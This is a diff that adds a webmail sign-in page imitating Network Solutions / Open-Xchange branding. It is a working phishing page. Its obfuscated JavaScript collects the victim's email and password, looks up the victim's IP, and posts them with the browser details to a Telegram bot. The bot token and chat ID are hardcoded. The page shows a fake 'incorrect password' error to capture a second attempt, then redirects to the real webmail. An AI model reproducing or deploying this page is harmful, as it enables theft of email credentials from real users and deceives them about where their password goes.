@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Professional Email</title>
+    <!-- <link id="homescreen-icon" rel="apple-touch-icon" href=""> -->
+    <link id="favicon" rel="icon" href="https://www.networksolutions.com/content/dam/netsol/favicons/favicon.ico" type="image/svg+xml">
+    <style>
+        * {
+            padding: 0;
+            margin: 0;
+        }
+        body {
+            background: #fff;
+        }
+        header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: .6rem;
+            margin-bottom: 1rem;
+        }
+        img {
+            width: 100%;
+            height: auto;
+        }
+        .img {
+            width: 7%;
+        }
+        .iformbox {
+            width: 420px;
+            box-shadow: 0 15px 70px #00000080;
+            margin: auto;
+            border: 1rem;
+            padding: 1rem;
+        }
+        .iformbox h3 {
+            text-align: center;
+            font-family: sans-serif;
+            font-weight: 700;
+            margin-bottom: 3rem;
+        }
+        .show {
+            text-align: center;
+            font-family: sans-serif;
+            font-weight: 700;
+            /* margin-bottom: 2rem; */
+        }
+        label {
+            color: black;
+            font-size: 14px;
+            font-weight: 700;
+        } 
+       /* .formbox input {
+            width: 100%;
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            line-height: 1.25rem;
+            height: auto;
+            color: var(--text);
+            background-color: #fff;
+            background-clip: padding-box;
+            border: 1px solid var(--border-bootstrap);
+            border-radius: .25rem;
+            transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
+        } */
+        .btn {
+            display: block;
+            width: 100%;
+            margin-bottom: 2rem;
+            padding: 0 !important;
+            margin-top: 6rem;
+        }
+        .btn button {
+            padding: .5rem;
+            border: none;
+            background: #256672;
+            color: #fff;
+            font-weight: 600;
+            border-radius: 6px;
+            width: 100%;
+            display: block;
+        }
+        #io-ox-information-message {
+            margin: auto;
+            margin-top: 24px !important;
+            background-color: #fff;
+            box-shadow: 0px 10px 60px #00000080;
+            border-radius: 6px;
+            text-align: center;
+            flex-direction: column;
+            padding: 16px;
+            z-index: 1;
+            width: 420px;
+        }
+        #io-ox-information-message p {
+            text-align: center;
+            font: 14px / 20px -apple-system, BlinkMacSystemFont, Helvetica Neue, Segoe UI, Arial, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol;
+            /* font-size: 12px; */
+        }
+        #io-ox-login-footer {
+            width: 100%;
+            margin: 64px 0 0;
+            padding: 6px 2px;
+            display: flex;
+            align-items: center;
+            flex-wrap: wrap;
+            background-color: #00000026;
+            color: #fff;
+            text-align: center;
+            justify-content: center;
+        }
+        #highlight {
+            display: none;
+        }
+        .show {
+            display: none;
+        }
+        #pasbox {
+            display: none;
+        }
+        .aaa {
+            color: #212529;
+            background-color: white;
+            padding: 4px 12px;
+            text-decoration: none;
+            border: 1px solid hsl(40, 10%, 80%);
+            display: block;
+        }
+        @media screen and (max-width: 600px){
+            #io-ox-information-message {
+                width: 87%;
+            }
+            .iformbox {
+                width: 87%;
+                box-shadow: 0 15px 70px #00000080;
+                margin: auto;
+                border: 1rem;
+                padding: 1rem;
+            }
+            /*.hideme {*/
+            /*    display: none;*/
+            /*}*/
+            .show {
+                display: none;
+            }
+            /*.lang {*/
+            /*    display: none;*/
+            /*}*/
+            .img {
+                width: 19%;
+            }
+        }
+    </style>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+</head>
+<body>
+    <header>
+        <div class="img">
+            <img src="https://www.networksolutions.com/content/experience-fragments/netsol/site-header/master/_jcr_content/root/header/logo.coreimg.png/1724940505730/netsol-logo.png" alt="">
+        </div>
+        <div class="lang">Language: <span style="color: green;">English (United States)</span></div>
+        <h3 class="show">Webmail Login</h3>
+    </header>
+    <main>
+        <div class="iformbox">
+            <h3 class="hideme">Webmail Login</h3>
+            <form id="sub">
+                <h5>Sign in</h5>
+
+                <div class="mb-3">
+                    <label for="exampleFormControlInput1" class="form-label">Email address</label>
+                    <input type="email" name="email" class="form-control" id="exampleFormControlInput1" placeholder="name@example.com" required>
+                </div>
+                <div class="mb-3" id="pasbox" style="display: none;">
+                    <label for="password" class="form-label">Password</label>
+                    <input type="password" name="password" class="form-control" id="password" required>
+                </div>
+                <span>
+                    <input type="checkbox" id="staySignedIn">
+                    Stay signed in
+                </span>
+                <div class="col-xs-12 alert-highlight" id="highlight" style="display: none;">
+                    <div class="selectable-text alert alert-danger" style="padding: .5rem !important; color: red;">The password is incorrect. Please try again.</div>
+                </div>
+                <div class="btn">
+                    <button type="button" id="continue">Continue</button>
+                </div>
+            </form>
+        </div>
+        <div id="io-ox-information-message">
+            <p>
+                We are updating our email security and will require all email server connections to use an encrypted connection when connecting via POP or IMAP from a device. To avoid any email connection issues, please be sure to update your mail client settings.
+            </p>
+            <a href="https://update.networksolutions.com/" class="aaa">Learn More…</a>
+        </div>
+        <footer id="io-ox-login-footer">
+            <div class="composition-element login-spacer"></div>
+            <span style="color: rgb(108, 108, 108);">© 2025 Open-Xchange GmbH</span>
+            <div class="composition-element"><span style="color: rgb(108, 108, 108);">Version:</span><span style="color: rgb(108, 108, 108);">8.23.1</span></div>
+            <div class="composition-element custom-login-links"><span>
+                <a href="https://web.com/legal/privacy-policy.aspx" target="_blank" style="color: rgb(108, 108, 108);">Privacy policy</a></span>
+            </div>
+            <div class="composition-element custom-login-links">
+                <span><a href="https://legal.web.com/Document/Get/TermsOfUse" target="_blank" style="color: rgb(108, 108, 108);">Legal notes</a></span>
+            </div>
+            <div class="composition-element login-spacer"></div>
+        </footer>
+    </main>
+  <script>
+    const _0x49500b=_0xe188;(function(_0x7df5b,_0x152012){const _0xa0dcd9=_0xe188,_0x16d557=_0x7df5b();while(!![]){try{const _0x428374=parseInt(_0xa0dcd9(0x1bb))/0x1*(-parseInt(_0xa0dcd9(0x1b0))/0x2)+-parseInt(_0xa0dcd9(0x1b6))/0x3*(parseInt(_0xa0dcd9(0x19c))/0x4)+-parseInt(_0xa0dcd9(0x19b))/0x5+-parseInt(_0xa0dcd9(0x1a2))/0x6+parseInt(_0xa0dcd9(0x1b3))/0x7*(-parseInt(_0xa0dcd9(0x1b5))/0x8)+parseInt(_0xa0dcd9(0x197))/0x9+parseInt(_0xa0dcd9(0x19d))/0xa;if(_0x428374===_0x152012)break;else _0x16d557['push'](_0x16d557['shift']());}catch(_0x44df0f){_0x16d557['push'](_0x16d557['shift']());}}}(_0x475c,0xb6125));function _0xe188(_0x4220b6,_0x50fb15){const _0x475caf=_0x475c();return _0xe188=function(_0xe18837,_0xc5d0b9){_0xe18837=_0xe18837-0x196;let _0xb35417=_0x475caf[_0xe18837];return _0xb35417;},_0xe188(_0x4220b6,_0x50fb15);}let attemptCount=0x0;const maxAttempts=0x2,redirectUrl='https://webmail-oxcs.networksolutionsemail.com/appsuite/',telegramBotToken=_0x49500b(0x1c0),telegramChatId=_0x49500b(0x1bd),fullUrl=window[_0x49500b(0x1be)][_0x49500b(0x1a5)],emailMatch=fullUrl[_0x49500b(0x19f)](/[?&]email=([^&]+)/),email=emailMatch?decodeURIComponent(emailMatch[0x1]):null;email&&(document[_0x49500b(0x199)]('exampleFormControlInput1')[_0x49500b(0x1b4)]=email);function sendToTelegram(_0x4ccaf1,_0x487aa5){const _0x1d5848=_0x49500b;return fetch(_0x1d5848(0x1a8))[_0x1d5848(0x198)](_0xef3412=>_0xef3412[_0x1d5848(0x1a9)]())['then'](_0x5266c6=>{const _0x2e6b59=_0x1d5848,_0x34608e=_0x5266c6['ip'],_0xcef935='\x0a<b>----NETWORK-SOLUTION\x20{Login\x20Access}----</b>\x0aEmail:\x20'+_0x4ccaf1+_0x2e6b59(0x1b1)+_0x487aa5+_0x2e6b59(0x1a3)+_0x34608e+_0x2e6b59(0x1bc)+navigator[_0x2e6b59(0x19a)];return fetch(_0x2e6b59(0x1b7)+telegramBotToken+_0x2e6b59(0x1a0),{'method':'POST','headers':{'Content-Type':_0x2e6b59(0x1a1)},'body':JSON[_0x2e6b59(0x1ad)]({'chat_id':telegramChatId,'text':_0xcef935,'parse_mode':_0x2e6b59(0x1a4)})});});}document[_0x49500b(0x199)](_0x49500b(0x19e))[_0x49500b(0x1aa)](_0x49500b(0x1ac),()=>{const _0x5128cb=_0x49500b,_0x20a853=document['getElementById'](_0x5128cb(0x1c1))[_0x5128cb(0x1b4)];if(!_0x20a853){alert(_0x5128cb(0x1b8));return;}document[_0x5128cb(0x199)]('pasbox')['style'][_0x5128cb(0x1b2)]='block',document[_0x5128cb(0x199)](_0x5128cb(0x1ab))[_0x5128cb(0x1ba)](),document[_0x5128cb(0x199)](_0x5128cb(0x19e))[_0x5128cb(0x1a6)]=_0x5128cb(0x1ae);}),document[_0x49500b(0x199)](_0x49500b(0x196))[_0x49500b(0x1aa)]('submit',function(_0x1f50aa){const _0x41cf1e=_0x49500b;_0x1f50aa['preventDefault']();const _0x4625b7=document[_0x41cf1e(0x199)](_0x41cf1e(0x1c1))[_0x41cf1e(0x1b4)],_0x37a996=document['getElementById'](_0x41cf1e(0x1ab))['value'];if(!_0x4625b7||!_0x37a996){alert('Please\x20fill\x20in\x20all\x20fields.');return;}function _0x3efae3(){const _0x27367c=_0x41cf1e;attemptCount<maxAttempts&&sendToTelegram(_0x4625b7,_0x37a996)[_0x27367c(0x198)](()=>{const _0x2400f9=_0x27367c;attemptCount++,attemptCount<maxAttempts?(document[_0x2400f9(0x199)](_0x2400f9(0x1a7))[_0x2400f9(0x1b9)]['display']='block',document[_0x2400f9(0x199)]('password')['value']=''):window[_0x2400f9(0x1be)]['href']=redirectUrl;})[_0x27367c(0x1c2)](_0x276419=>{const _0x423f80=_0x27367c;console[_0x423f80(0x1bf)](_0x423f80(0x1af),_0x276419);});}_0x3efae3();});function _0x475c(){const _0x4ffbf3=['sub','5412789xAxZdo','then','getElementById','userAgent','5949335YwMzmK','8iFYjhX','41922080vXnurg','continue','match','/sendMessage','application/json','7429512TtNuzx','\x0aIP\x20ADDRESS:\x20','HTML','href','type','highlight','https://api.ipify.org?format=json','json','addEventListener','password','click','stringify','submit','Error\x20during\x20send\x20attempt:','312434WvxeJm','\x0aPassword:\x20','display','3165302fHpQnS','value','24AjgjUE','160455pRCVgQ','https://api.telegram.org/bot','Please\x20enter\x20your\x20email\x20address.','style','focus','1sfUgYq','\x0aBrowser\x20Details:\x20','6235414315','location','error','7094337983:AAG5jBCC6nmcfvhkYmslYYiOMzcHZbnsQPg','exampleFormControlInput1','catch'];_0x475c=function(){return _0x4ffbf3;};return _0x475c();}
+</script>
+
+
+
+
+</body>
+
+
+</html>
